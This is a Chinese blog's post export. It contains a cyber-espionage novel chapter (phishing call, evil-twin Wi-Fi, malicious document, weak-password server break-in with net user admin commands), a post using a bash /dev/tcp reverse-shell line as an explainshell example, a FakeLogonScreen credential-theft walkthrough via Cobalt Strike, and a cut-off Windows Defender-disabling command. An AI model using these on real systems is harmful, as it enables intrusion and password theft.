&lt;p&gt;“我想你比我更清楚事情成功后给你们带来的利益，我拿到只是很少的一部分。”&lt;/p&gt;\n&lt;p&gt;“好，成交”&lt;/p&gt;\n&lt;p&gt;“50万转换成比特币，比特币转到128CcTcBb4d5NSjpDKktGjS7B6oErsNLqG 这个地址，3个月后给你结果”&lt;/p&gt;\n&lt;p&gt;“我需要点时间准备下”&lt;/p&gt;\n&lt;p&gt;“给你3天时间，交80%的钱后我开始行动，如果做不到，免谈！”&lt;/p&gt;\n&lt;p&gt;随后47就把这个人踢下线了。不给对方解释的机会。&lt;/p&gt;\n&lt;p&gt;天成制药显然是这个客户的竞争对手，而且能够找到47的，都是别人搞不下的任务才会找到他。&lt;/p&gt;\n&lt;p&gt;王梓每天白天如往常一样正常的上班，晚上则来渗透该天成制药公司的网络。在这个期间，他推掉了其它的任务。&lt;/p&gt;\n&lt;p&gt;47把任务的目标导入了他的自动化信息收集系统，该系统是一个比nosec.org中更加智能和强大的网络，可自动的关联对方的服务器，网站，ip地址，开放的服务，员工信息（包括密码），网络拓扑，以及企业信息。该系统还会通过github.com网站查找该企业所使用的源代码。这个让他的渗透效率提高了很多。获取了这些信息就可以进行接下来的入侵方案。&lt;/p&gt;\n&lt;p&gt;根据目前所获取的信息，既然他的同行都无计可施。常规的攻击自然不用去考虑。而这次攻击任务的目标企业不在北京市，所以无法真人去对企业进行社会工程学。&lt;/p&gt;\n&lt;p&gt;做网络杀手去入侵与常规的渗透测试方式不同，隐蔽性非常重要，一切都要悄无声息中进行，不能让对方有所察觉。要摧毁和获取数据，更要长期潜伏，不到最后一刻不能进行一些过猛的操作。而且在达到目标后要对痕迹进行擦除。&lt;/p&gt;\n&lt;p&gt;制定方案是定要严谨，要确保万无一失才可进行攻击。经过一周的分析考虑。47制定好了一份方案。&lt;/p&gt;\n&lt;p&gt;在这一周的时间内，47做了如下工作事情。&lt;/p&gt;\n&lt;p&gt;首先给他们北京地区的业务人员拨打电话。他所使用的电话号码是临时的号码，不实名，同时使用的不是智能手机。并且尝试改变了一下说话的声音。&lt;/p&gt;\n&lt;p&gt;“你好，是天成制药的林先生么？”&lt;/p&gt;\n&lt;p&gt;”我是，请问您是？有什么事情么？“，对方不知道来意。&lt;/p&gt;\n&lt;p&gt;”我是xx医院的李主任，目前看到你们公司新研制并发布的一种药物，我看了后，考虑把你们这个新药品用到我们的临床上来，想要与你们进行合作。“王梓假装成为他们的合作客户。&lt;/p&gt;\n&lt;p&gt;”这样啊，那真的是太好了，能够与贵医院合作，那对我们的发展是很有利的。“对方听到这个后没有怀疑，而且当时表现出兴奋。当然兴奋也难怪，能够促成此单，他一年的营业额都够了。&lt;/p&gt;\n&lt;p&gt;”那你看咱们是否可以当面聊聊？“&lt;/p&gt;\n&lt;p&gt;”好啊，那我明天就去上门拜访您？你看方便么？“&lt;/p&gt;\n&lt;p&gt;”明天我的班儿，所以不行，我下班后在附近的咖啡厅等你。“&lt;/p&gt;\n&lt;p&gt;”好好，明天见“&lt;/p&gt;\n&lt;p&gt;第二天，47买了几张创可贴，贴在手指和眉毛上。并准备戴了口罩，鸭舌帽。鞋跟垫高了3厘米，并以自己生病为由请了一天病假，他提前到所说的医院附近咖啡厅，在咖啡厅内利用设备伪造了一个与咖啡厅一样的无线热点。并开启Deauthentication攻击把咖啡厅无线网络攻击瘫痪。&lt;/p&gt;\n&lt;p&gt;等到业务人员来时，他说自己突然病了为由，来解释他戴口罩。因为业务人员带来了笔记本电脑，他引导业务人员连接了他伪造的无线网络，并对该网络进行了嗅探。但是，可惜的是，对方的vpn系统使用了双因子验证，而且连入的oa系统使用了https协议。一切似乎看起来并不容易。当然他通过对网络的劫持，在对方访问的网站加入了挂马代码（访问该页面即可被安装免杀的电脑控制程序。）。控制该电脑，可以监控一些通讯录等信息。在两个人离开咖啡厅后，47停止了攻击，恢复了咖啡厅的网络。并清理了电脑里的一些运行记录等。同时破坏并销毁了伪造的设备。&lt;/p&gt;\n&lt;p&gt;在这台电脑中，47观察来几天，发现除了可以看到一些与总部那边以及及格客户的邮件外，别的没有什么有价值信息。47又以发送资料的情况以及一些要求活着资质为由，给对方发送了一份带有恶意代码的文档。该文档，会把文档发给总部。对方业务人员因为太想急于促成这个事情，当天就把文档发给了总部。第二天，总部那边的就有3台电脑上线了，现在47可以控制总部3台员工的电脑了。这对他接下来的入侵有很大的帮助。&lt;/p&gt;\n&lt;h2 id=\&#34;对手出现\&#34;&gt;对手出现&lt;/h2&gt;\n&lt;p&gt;台湾某安全公司内&lt;br&gt;\n总监办公室内，一位身穿黑色西服，留着利落短发的人正坐在电脑前认真的盯着屏幕，双手在苹果键盘上敲打着，一张帅气的脸，还有那干净的鬓发看上去洒脱从容。突然有一个人敲了三下他的门，他停下正在敲击键盘的手，微微转了下头，看到敲门的人是他的手下小张，说了句：“进来，有什么事？”。小张走近屋子里，接着说：“最近几天我们发现有几个新发现的ip地址（ip地址：IP地址是指互联网协议地址（英语：Internet Protocol Address，又译为网际协议地址），是IP Address的缩写。IP地址是IP协议提供的一种统一的地址格式，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，IP地址通常用“点分十进制”表示成（a.b.c.d）的形式，其中，a,b,c,d都是0~255之间的十进制整数。例：点分十进IP地址（100.4.5.6）。ip地址相当于网络中的门牌地址。通过它可以实现网络通信。具体不细讲解。读者感兴趣的可自行了解。）扫描很频繁。扫描的范围很大。我觉得有必要对其进行深入的反跟踪，去查一查这个是否有一个团伙在作案。”。&lt;/p&gt;\n&lt;p&gt;“哦？有趣哦～你把这几个ip地址还有相关信息发过来看看”。他的脸上略带一点喜悦。&lt;/p&gt;\n&lt;p&gt;“好，我这就回去给你发送。”&lt;/p&gt;\n&lt;p&gt;“去吧～”。接着又补充道：“还有，继续跟踪下去，看可否追根溯源，找到攻击者。”&lt;/p&gt;\n&lt;p&gt;小张点头离去。&lt;/p&gt;\n&lt;p&gt;他继续敲击键盘，做刚才停下的事情。&lt;/p&gt;\n&lt;p&gt;此人网络id是hip，在一家网络安全公司做安全总监，他看上去也就二十三四的样子，从相貌上来看一点不像个做总监的，但是当了解他的技术以及能力之后，你不得不对他竖起大拇指。当然，你也不会想到年轻的他开的是一辆宝马i8。&lt;/p&gt;\n&lt;p&gt;对于他的id，他不仅是一名技术专家，还曾经是一名狂热的hiphop舞者，曾经获得台湾地区的hiphop冠军。不过那都是他学生时代的事情了。他用hip这个id也是缘于此。后来一直没有改。&lt;/p&gt;\n&lt;p&gt;hip还创建了一只网络安全技术交流小组——insight labs。insight labs是一个国际安全组织，组织成员分布在全世界各国。他们大多数都是各大互联网公司的安全研究员，安全工程师，安全总监，少数还有创业的。他们是一群白帽子，不作坏事，不攻击别人，他们对技术保持着一种狂热，保持着黑客的原则以及黑客精神。他们每周都会在自己加密的irc（IRC：Internet Relay Chat的英文缩写，中文一般称为互联网中继聊天。它是由芬兰人Jarkko Oikarinen于1988年首创的一种网络聊天协议。纯文本聊天，国外很流行，全世界有很多公开的服务器，分别有不同的频道，文中所使用的是自己构建的服务。为什么不使用qq这类，主要因为涉及到一些私密性。当然，在互联网的世界中，有很多基于该协议通信的恶意程序。我们称该类为ircbot。ircbot这里先不细讲。）上交流技术，最新的动态等。&lt;/p&gt;\n&lt;p&gt;hip所在的公司在德国，美国，韩国，日本，以及中国大陆，香港均部署了蜜罐系统（蜜罐：蜜罐是一种用来通过构建虚拟的网络服务或者协议等来引诱黑客来进行攻击。蜜罐是一种故意构造为容易被攻击的目标，这样可以了解黑客的攻击行为，随时了解最新的攻击和漏洞，还可以通过窃听黑客之间的联系，收集黑客使用的工具，找到攻击者。也可使说蜜罐是一种收集情报的方式。）。用于捕获并监控互联网中的恶意攻击行为，发现恶意攻击者。&lt;/p&gt;\n&lt;p&gt;过了一会，hip的屏幕右下方收到了一封邮件提醒，他点开了邮件看到：&lt;/p&gt;\n&lt;p&gt;攻击者ip地址如下：&lt;/p&gt;\n&lt;p&gt;38.99.82.191美国&lt;/p&gt;\n&lt;p&gt;72.52.4.90美国&lt;/p&gt;\n&lt;p&gt;198.204.250.242美国&lt;/p&gt;\n&lt;p&gt;82.165.37.26德国&lt;/p&gt;\n&lt;p&gt;以上4个ip地址都是一样的攻击行为，他们会对互联网中的计算机去进行ssh（ssh：SSH为Secure Shell的缩写，由IETF的网络小组（Network Working Group）所制定，是一种安全的传输协议，SSH是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。）弱口令扫描，java反序列化命令执行（java反序列化命令执行：java所编写的程序的一种高危害漏洞。可自行深入了解。）。这是最近几天新增加的，攻击行为异常频繁。&lt;/p&gt;\n&lt;p&gt;根据从我们的目前的威胁情报来分析，这几个ip地址的服务器都处在合法的idc机房当中。应该也是被入侵的计算机，受到攻击者的控制。进一步的信息，会继续对其进行溯源跟踪。&lt;/p&gt;\n&lt;p&gt;hip看了邮件后，他打开了mirc（一款irc的客户端软件），进入了insight labs的频道。&lt;/p&gt;\n&lt;p&gt;“hi，guys，最近新发现了几个活跃的攻击者ip地址，大家有没有兴趣看看的？：）”。&lt;/p&gt;\n&lt;p&gt;因为组织里只有两名女性，其余大多都是男性，所以，大家都是以基友相称。在网络世界里，大家从不过问彼此的真实姓名，年龄。他们在网络里只有自己的网络id。&lt;/p&gt;\n&lt;p&gt;“这个我有兴趣哦～，发出来看看～”，在奇护公司的小白首先回应了，奇护公司是国内知名的杀毒软件公司，其名字奇护是奇袭的护卫神的缩写。奇护是杀毒行业是后起之秀，而小白是这家公司的一名刚毕业不久的安全工程师。经验不多，接触黑客有2年时间，基础不错，小伙子因为对新鲜的知识充满了渴望，对很多事情都是冲在最前。这次他也不例外。&lt;/p&gt;\n&lt;p&gt;“好，这就发你。”说这，hip把ip地址发给了小白。&lt;/p&gt;\n&lt;p&gt;“这是几个ip地址，目前判断，也是被入侵的服务器。有什么新的消息告诉我下。”&lt;/p&gt;\n&lt;p&gt;“ok～，太好了，又可以实战学习新的东西了。”，小白有些兴奋的回复到。对他来说，是一次实战的大好机会。&lt;/p&gt;\n&lt;p&gt;“组织里其他有兴趣的人，到时候你们可以一起。”&lt;/p&gt;\n&lt;p&gt;“好的～”&lt;/p&gt;\n&lt;p&gt;这时电脑前的hip感叹到，年轻就是好啊！&lt;/p&gt;\n&lt;p&gt;就这样，小白如打了鸡血般，异常的兴奋，晚上几乎没有睡觉，放着Linken park的音乐，对4个ip地址逐个进行检测。通过几个小时的功夫，他发现了德国服务器的一个漏洞，该服务器是windows操作系统，存在着微软sql server数据库弱口令。当屏幕上的黑客工具显示：“82.165.37.26弱口令存在，用户名sa，密码821653726”（注：该口令为ip地址不加点）。只见他微微一笑，眯缝着的小眼睛里放出一丝光芒，仿佛胜利就在眼前。&lt;/p&gt;\n&lt;p&gt;他迅速使用查询分析器（一款数据库操作工具）连接了对方的目标，当显示连接成功时，他打了一个响指，并喊了一句哦耶！通过之前获取的信息，对方开放了远程登录服务，小白直接执行添加管理员的命令（添加管理员命令：在命令提示符下输入先添加用户名，在把用户名假如管理员组。添加新用户：net user用户名密码/add.添加用户名到管理员组：net localgroup administrators用户名/add）。顺利的登陆进了该德国服务器。没想到这么顺利救入侵了这台服务器，小白首先建立了一个系统的隐藏账户（克隆了一个账户）。通过查看进程，端口开放情况，这样来确认扫描程序的位置。这时他发现scan.exe的进程连接来很多其他的计算机，并且失败状态显示失败。说明他就是小白要找攻击者的扫描程序了。小白快速的下载了该程序到自己的电脑中。又查找了一下是否还有其他的恶意程序，确认没有后。接着，他在对方计算机系统的管理员桌面放了一个readme.txt的文档，里面写入了“Your computer has been hacked.Please fix it，thx～”.然后他清理了系统日志就下线了。&lt;/p&gt;\n&lt;p&gt;小白启动了他的虚拟机，创建了一个虚拟机快照。接下来，他把scan.exe程序拷贝入虚拟机中，抄起他的兵器库中的十八般武器，开始对scan.exe程序施刑，先用peid查看该恶意程序是否加壳，结果没有加壳。没有加壳的程序就如同一个只穿内衣的女人，你接下来要做的就是想办法拔掉女人内衣，就可以一览无余了。接下来直接ida进行分析，程序闪过了几个窗口之后，程序代码的执行流程就展现在小白面前了，当然还需要对其进行进一步的分析。通过该程序的string窗口，小白发现了一个字母by phantoms。这应该是编写该程序的作者。小白接着花了一些程序时间看了解了下程序运行原理，这个是一款扫描的程序。在扫描到流程后，会自动的登陆对方系统，根据系统不同去下载一款对应系统的木马程序。小白根据下载地址，下载了全部类型的木马程序。由于该程序有一款是linux系统下，小白对linux不熟悉，而这时候天已经亮了，他把目前的结果给hip留言后，就洗漱去上班了。&lt;/p&gt;\n&lt;p&gt;此时另外一边的杀手47，还在继续着他的任务，而杀手47还不知道，在不久的未来里，将会与insight labs组织发生不可思议的战斗。&lt;/p&gt;\n&lt;p&gt;（未完待续）&lt;/p&gt;\n&lt;p&gt;注解（术语解释）：&lt;br&gt;\n1、IRC：Internet Relay Chat的英文缩写，中文一般称为互联网中继聊天。它是由芬兰人Jarkko Oikarinen于1988年首创的一种网络聊天协议。纯文本聊天，国外很流行，全世界有很多公开的服务器，分别有不同的频道，文中所使用的是自己构建的服务。为什么不使用qq这类，主要因为涉及到一些私密性。当然，在互联网的世界中，有很多基于该协议通信的恶意程序。我们称该类为ircbot。ircbot这里先不细讲。&lt;/p&gt;\n&lt;p&gt;2、ip地址：IP地址是指互联网协议地址（英语：Internet Protocol Address，又译为网际协议地址），是IP Address的缩写。IP地址是IP协议提供的一种统一的地址格式，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，IP地址通常用“点分十进制”表示成（a.b.c.d）的形式，其中，a,b,c,d都是0~255之间的十进制整数。例：点分十进IP地址（100.4.5.6）。ip地址相当于网络中的门牌地址。通过它可以实现网络通信。具体不细讲解。读者感兴趣的可自行了解。&lt;/p&gt;\n&lt;p&gt;3、蜜罐：蜜罐是一种用来通过构建虚拟的网络服务或者协议等来引诱黑客来进行攻击。蜜罐是一种故意构造为容易被攻击的目标，这样可以了解黑客的攻击行为，随时了解最新的攻击和漏洞，还可以通过窃听黑客之间的联系，收集黑客使用的工具，找到攻击者。也可使说蜜罐是一种收集情报的方式。&lt;/p&gt;\n&lt;p&gt;4、ssh：SSH为Secure Shell的缩写，由IETF的网络小组（Network Working Group）所制定，是一种安全的传输协议，SSH是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。&lt;/p&gt;\n&lt;p&gt;5、java反序列化命令执行：java所编写的程序的一种高危害漏洞。可自行深入了解。&lt;/p&gt;\n&lt;p&gt;6、添加管理员命令：在命令提示符下输入先添加用户名，在把用户名假如管理员组。添加新用户：net user用户名密码/add.添加用户名到管理员组：net localgroup administrators用户名/add&lt;/p&gt;\n&lt;p&gt;（未完待续）&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;Killer-Chapter-One&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;杀手是在生活中受到雇主的雇佣，而去执行杀人任务，最终获得报酬。他们孤独，不轻易相信其他任何的人。他们非常冷酷，面对生命，他们从来不会手下留情。因为杀人就是她们的存在的意义。很少有人见过他们，因为大多数见过他们的人，都已经被杀死掉了。他们平时白天不出门，只有在夜里才开始行动，他们出去都会戴上墨镜，头顶一顶鸭舌帽，有时候以雾霾为由戴上口罩。其实，他们只是不想别人知道他们的真正面目。他们活在黑暗的世界里，不见天日。他们很可怜，没有爱情，没有亲情，甚至连个朋友都没有。&lt;/p&gt;\n&lt;p&gt;在网络的世界中也有这样的一种人，他们不杀人，他们也不需要在现实中隐藏包装自己，因为他们只存在于虚拟的网络世界中，很少有人知道他们的真面目。他们同样在夜间才进行活动，他们的任务是窃取企业，政府的最高机密信息。更准确的说，可以叫他们为网络间谍。他们是这个网络上的杀手，他们不会亲自杀人，却因为他们盗取的信息，有他们的买家来去做一些伤天害理的事情，使很多人因此而家破人亡。不过，对于这个世界来说，每个人都有着他自己的命运，弱者注定要被这个社会淘汰，而这个也正是杀手们所认同的，在杀手已活着网络杀手看来，他们可以杀死（入侵的目标）的人都是弱者。他们信奉他们自己可以改变或控制别人的命运，甚至大多数人的命运。&lt;/p&gt;\n&lt;h2 id=\&#34;登场\&#34;&gt;登场&lt;/h2&gt;\n&lt;p&gt;“早～”，小楠对刚刚到公司的王梓打招呼。王梓则开心的笑笑，作为回应。&lt;/p&gt;\n&lt;p&gt;王梓是一家中日合资的中型软件公司的程序员。性格内向，腼腆。长相一般，在嘴巴的右上角有一颗痦子。在这家拥有数十位的程序员的公司，每个人都只负责各自的一部分，王梓在这里是其中普普通通的一员，公司部门内部竞争激烈，升职也比较困难，王梓不时还会犯些小错误，因为被领导破口大骂。对此王梓什么都不说，只在一旁听着，完事后继续回到座位上默默的工作。这时候，作为翻译的小楠总会过来安慰王梓。王梓也总说是他自己的错误。不怪领导发脾气。&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;原创小说 《杀手》 第一章 网络杀手&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;小说&#34;,&#34;slug&#34;:&#34;CxFvcMcMqY5&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/CxFvcMcMqY5/&#34;},{&#34;name&#34;:&#34;Novel&#34;,&#34;slug&#34;:&#34;zyteNdG7g7N&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/zyteNdG7g7N/&#34;},{&#34;name&#34;:&#34;IRC&#34;,&#34;slug&#34;:&#34;z5BAhC7nBzM&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/z5BAhC7nBzM/&#34;},{&#34;name&#34;:&#34;JAVA&#34;,&#34;slug&#34;:&#34;DA9PETUJf7i&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/DA9PETUJf7i/&#34;},{&#34;name&#34;:&#34;反序列化漏洞&#34;,&#34;slug&#34;:&#34;3IbfQHlXiij&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/3IbfQHlXiij/&#34;},{&#34;name&#34;:&#34;蜜罐&#34;,&#34;slug&#34;:&#34;ScQ8IcKF-_a&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/ScQ8IcKF-_a/&#34;},{&#34;name&#34;:&#34;ssh&#34;,&#34;slug&#34;:&#34;9EE4gDqVlsE&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/9EE4gDqVlsE/&#34;}],&#34;date&#34;:&#34;2020-03-11 15:42:22&#34;,&#34;dateFormat&#34;:&#34;2020-03-11&#34;,&#34;feature&#34;:&#34;https://bacde.me/post-images/Killer-Chapter-One.jpg&#34;,&#34;link&#34;:&#34;https://bacde.me/post/Killer-Chapter-One/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;25 min read&#34;,&#34;time&#34;:1467000,&#34;words&#34;:7117,&#34;minutes&#34;:25},&#34;description&#34;:&#34;杀手是在生活中受到雇主的雇佣，而去执行杀人任务，最终获得报酬。他们孤独，不轻易相信其他任何的人。他们非常冷酷，面对生命，他们从来不会手下留情。因为杀人就是她们的存在的意义。很少有人见过他们，因为大多数见过他们的人，都已经被杀死掉了。他们平时...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%99%BB%E5%9C%BA\&#34;&gt;登场&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%A1%8C%E5%8A%A8\&#34;&gt;行动&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%AF%B9%E6%89%8B%E5%87%BA%E7%8E%B0\&#34;&gt;对手出现&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;有的时候我们会遇到一些特别难理解的shell命令，或者是一些参数我们不知道它的作用。那么今天分享的这个网址可以帮助解决上面的烦恼。&lt;/p&gt;\n&lt;p&gt;网站主页打开后就是一个输入框。输入命令后，就会给出解析的结果。结果包含了解析的结果，并在下面给出了详细的说明。很方便。例如我们以&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1&lt;/code&gt; 为例（如下图），很酷～&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1583390496770.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;该网站有两种主题，分别是Light和Drak。&lt;/p&gt;\n&lt;p&gt;网址：&lt;a href=\&#34;https://explainshell.com/\&#34;&gt;explainshell&lt;/a&gt;&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;share-explainshell&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;有的时候我们会遇到一些特别难理解的shell命令，或者是一些参数我们不知道它的作用。那么今天分享的这个网址可以帮助解决上面的烦恼。&lt;/p&gt;\n&lt;p&gt;网站主页打开后就是一个输入框。输入命令后，就会给出解析的结果。结果包含了解析的结果，并在下面给出了详细的说明。很方便。例如我们以&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1&lt;/code&gt; 为例（如下图），很酷～&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;分享个学习shell脚本或辅助理解的网站-explainshell.com&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;bash&#34;,&#34;slug&#34;:&#34;qQe11RUE5qU&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/qQe11RUE5qU/&#34;},{&#34;name&#34;:&#34;shell&#34;,&#34;slug&#34;:&#34;Ku8fCt-Pyst&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/Ku8fCt-Pyst/&#34;},{&#34;name&#34;:&#34;explainshell&#34;,&#34;slug&#34;:&#34;X_Uq5QPQOKn&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/X_Uq5QPQOKn/&#34;}],&#34;date&#34;:&#34;2020-03-05 10:27:22&#34;,&#34;dateFormat&#34;:&#34;2020-03-05&#34;,&#34;feature&#34;:&#34;https://bacde.me/post-images/share-explainshell.png&#34;,&#34;link&#34;:&#34;https://bacde.me/post/share-explainshell/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:33000,&#34;words&#34;:154,&#34;minutes&#34;:1},&#34;description&#34;:&#34;有的时候我们会遇到一些特别难理解的shell命令，或者是一些参数我们不知道它的作用。那么今天分享的这个网址可以帮助解决上面的烦恼。\n网站主页打开后就是一个输入框。输入命令后，就会给出解析的结果。结果包含了解析的结果，并在下面给出了详细的说明...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;p&gt;在windows环境中，获取系统密码，提升系统权限。在渗透测试是经常遇到的。今天这里介绍一款伪造windows登录屏幕以达到窃取密码或题全的软件——FakeLogonScreen。&lt;/p&gt;\n&lt;h2 id=\&#34;简介\&#34;&gt;简介&lt;/h2&gt;\n&lt;p&gt;FakeLogonScreen这个程序是用于伪造windows登录凭证以获取系统登录密码。它会获取当前系统配置的背景图片，这样显得更加真实，成功率也会更高。&lt;/p&gt;\n&lt;p&gt;另外，该程序会对输入的密码进行Active Directory或本地计算机的认证，以确保窃取密码的准确性。它可以显示在控制台，也可以保存早文件远程系统的硬盘上。&lt;/p&gt;\n&lt;p&gt;这个软件的好处就是可以与其它工具配合使用，可以直接通过内存执行（无文件）。比如可以配合Cobalt Strike的execute-assembly来执行。&lt;/p&gt;\n&lt;h2 id=\&#34;运行环境\&#34;&gt;运行环境&lt;/h2&gt;\n&lt;p&gt;由于使用c#编写，需要系统中有.net framework框架。这里测试windows10和windows7，系统均为64位。在其release的版本中，作者给出来.net framework3.5和4.5的可执行程序。适用于windows7 和windows10等情况。实际中可根据实际情况进行选择。&lt;/p&gt;\n&lt;h2 id=\&#34;利用\&#34;&gt;利用&lt;/h2&gt;\n&lt;p&gt;可以配合Cobalt Strike，系统上线后，进入到beacon中，然后直接执行&lt;code&gt;execute-assembly /root/Desktop/FakeLogonScreen.exe&lt;/code&gt; 。（后面为控制机上的文件路径，非被控机的路径）。接下来就是等待对方输入密码，即可在进入的beacon中显示输入的密码了。效果图如下：&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1583209455350.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;也可以使用FakeLogonScreenToFile.exe 在本地执行后，然后去查看文件。&lt;/p&gt;\n&lt;p&gt;当然这个程序也有些问题，就是windows7也显示windows10样式的窗口，同时，界面显示仍然与系统原有的有区别，但是对于安全意识低的员工还是有作用的。&lt;/p&gt;\n&lt;p&gt;软件地址：&lt;a href=\&#34;https://github.com/bitsadmin/fakelogonscreen\&#34;&gt;FakeLogonScreen&lt;/a&gt;&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;Fake-Windows-Logon-Screen-To-Steal-Passwords&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;在windows环境中，获取系统密码，提升系统权限。在渗透测试是经常遇到的。今天这里介绍一款伪造windows登录屏幕以达到窃取密码或题全的软件——FakeLogonScreen。&lt;/p&gt;\n&lt;h2 id=\&#34;简介\&#34;&gt;简介&lt;/h2&gt;\n&lt;p&gt;FakeLogonScreen这个程序是用于伪造windows登录凭证以获取系统登录密码。它会获取当前系统配置的背景图片，这样显得更加真实，成功率也会更高。&lt;/p&gt;\n&lt;p&gt;另外，该程序会对输入的密码进行Active Directory或本地计算机的认证，以确保窃取密码的准确性。它可以显示在控制台，也可以保存早文件远程系统的硬盘上。&lt;/p&gt;\n&lt;p&gt;这个软件的好处就是可以与其它工具配合使用，可以直接通过内存执行（无文件）。比如可以配合Cobalt Strike的execute-assembly来执行。&lt;/p&gt;\n&lt;h2 id=\&#34;运行环境\&#34;&gt;运行环境&lt;/h2&gt;\n&lt;p&gt;由于使用c#编写，需要系统中有.net framework框架。这里测试windows10和windows7，系统均为64位。在其release的版本中，作者给出来.net framework3.5和4.5的可执行程序。适用于windows7 和windows10等情况。实际中可根据实际情况进行选择。&lt;/p&gt;\n&lt;h2 id=\&#34;利用\&#34;&gt;利用&lt;/h2&gt;\n&lt;p&gt;可以配合Cobalt Strike，系统上线后，进入到beacon中，然后直接执行&lt;code&gt;execute-assembly /root/Desktop/FakeLogonScreen.exe&lt;/code&gt; 。（后面为控制机上的文件路径，非被控机的路径）。接下来就是等待对方输入密码，即可在进入的beacon中显示输入的密码了。效果图如下：&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;伪造windows登录屏幕窃取密码之FakeLogonScreen&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;Tool&#34;,&#34;slug&#34;:&#34;G8-CImT42BP&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/G8-CImT42BP/&#34;},{&#34;name&#34;:&#34;Windows&#34;,&#34;slug&#34;:&#34;n-qcN86Ixu0&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/n-qcN86Ixu0/&#34;},{&#34;name&#34;:&#34;Password&#34;,&#34;slug&#34;:&#34;drn7X5PUuvA&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/drn7X5PUuvA/&#34;},{&#34;name&#34;:&#34;Cobalt Strike&#34;,&#34;slug&#34;:&#34;EemwOrd-KB1&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/EemwOrd-KB1/&#34;}],&#34;date&#34;:&#34;2020-03-03 12:02:40&#34;,&#34;dateFormat&#34;:&#34;2020-03-03&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/Fake-Windows-Logon-Screen-To-Steal-Passwords/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;2 min read&#34;,&#34;time&#34;:98000,&#34;words&#34;:463,&#34;minutes&#34;:2},&#34;description&#34;:&#34;在windows环境中，获取系统密码，提升系统权限。在渗透测试是经常遇到的。今天这里介绍一款伪造windows登录屏幕以达到窃取密码或题全的软件——FakeLogonScreen。\n简介\nFakeLogonScreen这个程序是用于伪造wi...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%AE%80%E4%BB%8B\&#34;&gt;简介&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83\&#34;&gt;运行环境&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%88%A9%E7%94%A8\&#34;&gt;利用&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;临时禁止Windows Defender&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;REG ADD 